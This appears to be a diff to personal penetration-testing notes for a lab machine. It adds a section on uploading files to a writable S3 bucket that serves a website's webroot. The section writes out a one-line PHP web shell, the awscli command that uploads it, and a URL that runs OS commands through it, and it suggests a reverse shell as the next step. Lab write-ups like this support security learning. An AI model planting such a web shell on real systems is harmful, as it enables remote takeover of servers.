@@ -49,3 +49,23 @@ aws --endpoint=http://s3.[domain name] s3 ls s3://[domain name]
 #  2024-02-24 15:02:08  11952  index.php
 ```
 - This particular example is that of the webroot of a website. An Apache server is using this S3 bucket as storage for the website's files. 
+
+### Copy Files to an S3 Bucket
+- In the example above, we could try uploading a PHP shell file to the S3 bucket and since it's uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we will achieve remote code execution.
+- Continuing with that example...
+```
+# create a PHP file to upload
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+# upload that file with awscli
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+```
+- Test that uploaded file by accessing it through the website: `http://thetoppers.htb/shell.php?cmd=id`
+- If the response from the server contains the output of the OS command `id`, then we have code execution on the box. Now you'd just need to work out a reverese shell, etc. 
+
+
+
+
+
+
+
+
